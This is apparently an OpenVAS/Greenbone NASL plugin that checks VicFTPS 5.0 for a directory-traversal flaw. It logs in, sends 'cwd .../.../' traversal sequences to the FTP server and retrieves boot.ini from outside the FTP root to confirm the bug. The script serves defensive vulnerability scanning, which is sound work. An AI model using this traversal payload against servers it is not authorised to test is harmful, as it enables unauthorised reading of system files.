if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100625" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-05-05 18:44:23 +0200 (Wed, 05 May 2010)" );
	script_bugtraq_id( 39919 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "VicFTPS Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/39919" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "FTP" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc", "os_detection.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "Host/runs_windows", "ftp/vicftps/detected" );
	script_tag( name: "summary", value: "VicFTPS is prone to a directory-traversal vulnerability because it
  fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue can allow an attacker to download arbitrary
  files outside of the FTP server root directory. This may aid in further attacks." );
	script_tag( name: "affected", value: "VicFTPS (Victory FTP Server) 5.0 is vulnerable. Other versions may
  also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "VicFTPS" )){
	exit( 0 );
}
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc1, user: user, pass: pass );
if( login_details ){
	ftpPort2 = ftp_get_pasv_port( socket: soc1 );
	if(ftpPort2){
		soc2 = open_sock_tcp( port: ftpPort2, transport: get_port_transport( ftpPort ) );
		if(soc2){
			send( socket: soc1, data: NASLString( "cwd .../.../.../.../.../.../.../.../\\r\\n" ) );
			result = ftp_recv_line( socket: soc1 );
			if(!ContainsString( result, "250" )){
				ftp_close( socket: soc1 );
				close( soc2 );
				close( soc1 );
				exit( 0 );
			}
			send( socket: soc1, data: NASLString( "retr boot.ini\\r\\n" ) );
			result = ftp_recv_data( socket: soc2 );
			close( soc2 );
			ftp_close( socket: soc1 );
			close( soc1 );
		}
	}
	if(result && egrep( pattern: "\\[boot loader\\]", string: result )){
		security_message( port: ftpPort );
		exit( 0 );
	}
}
else {
	close( soc1 );
	exit( 0 );
}
exit( 0 );

